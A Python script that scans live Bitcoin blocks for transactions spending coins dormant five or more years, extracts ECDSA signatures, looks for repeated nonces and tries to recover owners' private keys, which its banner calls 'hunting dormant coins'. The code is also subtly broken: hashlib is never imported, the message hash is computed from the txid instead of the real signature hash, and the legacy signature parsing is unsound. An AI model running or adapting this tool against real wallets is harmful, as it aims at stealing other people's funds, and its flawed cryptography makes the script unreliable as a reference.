#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  OLD UTXO LIVE SCANNER                                                      ║
║  Fetches dormant UTXOs (5+ years old) from Bitcoin blockchain               ║
║  Tests for repeated nonce vulnerabilities in real-time                       ║
║  Targets old wallets with potentially weak RNG                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import requests
import csv
import sys
import time
from datetime import datetime, timedelta
from collections import defaultdict

# Blockstream API
API_BASE = "https://blockstream.info/api"

def get_block_height():
    """Get current block height"""
    resp = requests.get(f"{API_BASE}/blocks/tip/height", timeout=10)
    return int(resp.text.strip())

def get_block_hash(height):
    """Get block hash by height"""
    resp = requests.get(f"{API_BASE}/block-height/{height}", timeout=10)
    return resp.text.strip()

def get_block_txs(block_hash):
    """Get all transactions in a block"""
    resp = requests.get(f"{API_BASE}/block/{block_hash}/txs", timeout=15)
    return resp.json()

def get_tx_details(txid):
    """Get transaction details"""
    resp = requests.get(f"{API_BASE}/tx/{txid}", timeout=10)
    return resp.json()

def get_utxo_age(txid, vout, current_height):
    """Calculate age of UTXO in blocks"""
    try:
        tx = get_tx_details(txid)
        if 'status' in tx and 'block_height' in tx['status']:
            creation_height = tx['status']['block_height']
            age_blocks = current_height - creation_height
            age_years = age_blocks / 52560  # ~52560 blocks per year
            return age_years, creation_height
        return 0, None
    except:
        return 0, None

def find_old_spending_txs(min_age_years=5, limit_blocks=10, txs_per_block=5):
    """
    Find transactions that spend old UTXOs (min_age_years old)
    Scans recent blocks for transactions spending dormant coins
    """
    print(f"\n🔍 Scanning for UTXOs older than {min_age_years} years...")
    
    current_height = get_block_height()
    print(f"   Current block height: {current_height:,}")
    
    old_spending_txs = []
    
    # Scan recent blocks
    for i in range(limit_blocks):
        block_height = current_height - i
        if block_height <= 0:
            continue
            
        block_hash = get_block_hash(block_height)
        txs = get_block_txs(block_hash)
        
        print(f"\n   Block {block_height:,} ({len(txs)} txs)")
        
        # Sample transactions from block
        sample_size = min(txs_per_block, len(txs))
        for tx in txs[:sample_size]:
            txid = tx['txid']
            
            # Check each input
            for vin_idx, vin in enumerate(tx.get('vin', [])):
                if 'prevout' not in vin:
                    continue
                    
                prev_txid = vin['txid']
                prev_vout = vin['vout']
                
                # Get age of UTXO being spent
                age_years, creation_height = get_utxo_age(prev_txid, prev_vout, current_height)
                
                if age_years >= min_age_years:
                    creation_date = "unknown"
                    if creation_height:
                        # Approximate date (Bitcoin genesis: 2009-01-03)
                        days_since_genesis = creation_height * 10  # ~10 min per block
                        genesis = datetime(2009, 1, 3)
                        creation_date = (genesis + timedelta(minutes=creation_height*10)).strftime('%Y-%m-%d')
                    
                    print(f"      🕰️  Found {age_years:.1f} year old UTXO!")
                    print(f"           Spent in: {txid[:16]}...")
                    print(f"           Created: {creation_date} (block {creation_height:,})")
                    
                    old_spending_txs.append({
                        'txid': txid,
                        'vin_idx': vin_idx,
                        'prev_txid': prev_txid,
                        'prev_vout': prev_vout,
                        'age_years': age_years,
                        'creation_height': creation_height
                    })
                    
                    if len(old_spending_txs) >= 20:  # Limit findings
                        return old_spending_txs
        
        time.sleep(0.5)  # Rate limiting
    
    return old_spending_txs

def extract_signatures_from_tx(txid):
    """Extract signature data from transaction"""
    try:
        tx = get_tx_details(txid)
        signatures = []
        
        for vin_idx, vin in enumerate(tx.get('vin', [])):
            if 'witness' in vin and len(vin['witness']) > 0:
                # SegWit transaction
                witness = vin['witness']
                if len(witness) >= 2:
                    sig_hex = witness[0]
                    if len(sig_hex) >= 140:  # DER signature
                        # Parse r, s from signature
                        if sig_hex.startswith('30'):
                            try:
                                sig_bytes = bytes.fromhex(sig_hex)
                                if sig_bytes[0] == 0x30 and sig_bytes[1] == len(sig_bytes)-1:
                                    r_len = sig_bytes[3]
                                    r = int.from_bytes(sig_bytes[4:4+r_len], 'big')
                                    s_start = 4 + r_len + 2
                                    s_len = sig_bytes[s_start-1]
                                    s = int.from_bytes(sig_bytes[s_start:s_start+s_len], 'big')
                                    
                                    # Get z (message hash) - simplified
                                    z = int.from_bytes(hashlib.sha256(bytes.fromhex(txid)).digest(), 'big') % N
                                    
                                    signatures.append({
                                        'vin': vin_idx,
                                        'r': hex(r),
                                        's': hex(s),
                                        'z': hex(z),
                                        'sig_hex': sig_hex
                                    })
                            except Exception as e:
                                pass
            elif 'scriptSig' in vin:
                # Legacy transaction
                script_sig = vin['scriptSig'].get('hex', '')
                if script_sig:
                    # Look for signatures in scriptSig
                    parts = script_sig.split('47')  # 0x47 = 71 bytes (common sig length)
                    for part in parts[1:]:
                        try:
                            sig_hex = '47' + part[:142]
                            if len(sig_hex) >= 144:
                                sig_bytes = bytes.fromhex(sig_hex)
                                if sig_bytes[0] == 0x30:
                                    r_len = sig_bytes[3]
                                    r = int.from_bytes(sig_bytes[4:4+r_len], 'big')
                                    s_start = 4 + r_len + 2
                                    s_len = sig_bytes[s_start-1]
                                    s = int.from_bytes(sig_bytes[s_start:s_start+s_len], 'big')
                                    
                                    z = int.from_bytes(hashlib.sha256(bytes.fromhex(txid)).digest(), 'big') % N
                                    
                                    signatures.append({
                                        'vin': vin_idx,
                                        'r': hex(r),
                                        's': hex(s),
                                        'z': hex(z),
                                        'sig_hex': sig_hex
                                    })
                        except:
                            pass
        
        return signatures
    except Exception as e:
        print(f"      ⚠️  Error extracting signatures: {e}")
        return []

def detect_repeated_nonce(signatures):
    """Detect repeated nonce (same r value)"""
    r_values = defaultdict(list)
    
    for sig in signatures:
        r_values[sig['r']].append(sig)
    
    vulnerabilities = []
    for r_val, sigs in r_values.items():
        if len(sigs) >= 2:
            vulnerabilities.append({
                'r': r_val,
                'signatures': sigs,
                'count': len(sigs)
            })
    
    return vulnerabilities

def recover_private_key(sig1, sig2):
    """Recover private key from two signatures with same nonce"""
    try:
        r = int(sig1['r'], 16)
        s1 = int(sig1['s'], 16)
        z1 = int(sig1['z'], 16)
        s2 = int(sig2['s'], 16)
        z2 = int(sig2['z'], 16)
        
        # k = (z1 - z2) / (s1 - s2)
        s_diff = (s1 - s2) % N
        if s_diff == 0:
            return None
        
        z_diff = (z1 - z2) % N
        k = (z_diff * pow(s_diff, -1, N)) % N
        
        # d = (s*k - z) / r
        d = ((s1 * k - z1) * pow(r, -1, N)) % N
        
        return d
    except Exception as e:
        return None

# SECP256K1 parameters
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def main():
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 20 + "OLD UTXO LIVE SCANNER" + " " * 34 + "║")
    print("║" + " " * 15 + "Hunting Dormant Coins with Weak RNG" + " " * 27 + "║")
    print("╚" + "═" * 78 + "╝")
    
    # Configuration
    MIN_AGE_YEARS = 5
    BLOCKS_TO_SCAN = 20
    TXS_PER_BLOCK = 10
    
    print(f"\n⚙️  Configuration:")
    print(f"   Minimum UTXO age: {MIN_AGE_YEARS} years")
    print(f"   Blocks to scan: {BLOCKS_TO_SCAN}")
    print(f"   Transactions per block: {TXS_PER_BLOCK}")
    
    # Find old spending transactions
    old_txs = find_old_spending_txs(MIN_AGE_YEARS, BLOCKS_TO_SCAN, TXS_PER_BLOCK)
    
    if not old_txs:
        print("\n❌ No old UTXOs found in recent blocks")
        print("   Try increasing --blocks or decreasing --years threshold")
        return
    
    print(f"\n📊 Found {len(old_txs)} transactions spending old UTXOs")
    
    # Extract and analyze signatures
    print("\n🔐 Extracting signatures and testing for vulnerabilities...")
    
    total_sigs = 0
    vulnerabilities_found = 0
    recovered_keys = []
    
    for tx_info in old_txs:
        txid = tx_info['txid']
        age = tx_info['age_years']
        
        print(f"\n   Analyzing tx {txid[:16]}... (UTXO age: {age:.1f} years)")
        
        sigs = extract_signatures_from_tx(txid)
        if not sigs:
            print("      No extractable signatures (Taproot or complex script)")
            continue
        
        total_sigs += len(sigs)
        print(f"      Extracted {len(sigs)} signatures")
        
        # Check for repeated nonces
        vulns = detect_repeated_nonce(sigs)
        
        if vulns:
            vulnerabilities_found += len(vulns)
            print(f"      🚨 VULNERABILITY DETECTED! Repeated nonce found!")
            
            for vuln in vulns:
                print(f"         R value: {vuln['r'][:32]}...")
                print(f"         Occurrences: {vuln['count']}")
                
                if vuln['count'] >= 2:
                    # Attempt key recovery
                    priv_key = recover_private_key(vuln['signatures'][0], vuln['signatures'][1])
                    
                    if priv_key:
                        print(f"         ✅ PRIVATE KEY RECOVERED!")
                        print(f"            d = 0x{priv_key:064x}")
                        
                        recovered_keys.append({
                            'txid': txid,
                            'r_value': vuln['r'],
                            'private_key': hex(priv_key),
                            'age_years': age
                        })
    
    # Summary
    print("\n" + "═" * 80)
    print("📈 AUDIT SUMMARY")
    print("═" * 80)
    print(f"   Old UTXOs analyzed: {len(old_txs)}")
    print(f"   Total signatures: {total_sigs}")
    print(f"   Vulnerabilities found: {vulnerabilities_found}")
    print(f"   Private keys recovered: {len(recovered_keys)}")
    
    if recovered_keys:
        print("\n🚨 CRITICAL: COMPROMISED ADDRESSES DETECTED!")
        for key_info in recovered_keys:
            print(f"   TX: {key_info['txid'][:16]}...")
            print(f"   Age: {key_info['age_years']:.1f} years")
            print(f"   Private Key: {key_info['private_key']}")
    else:
        print("\n✅ No vulnerabilities detected in old UTXOs")
        print("   Old wallets appear to be using secure RNG")
    
    print("\n" + "═" * 80)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
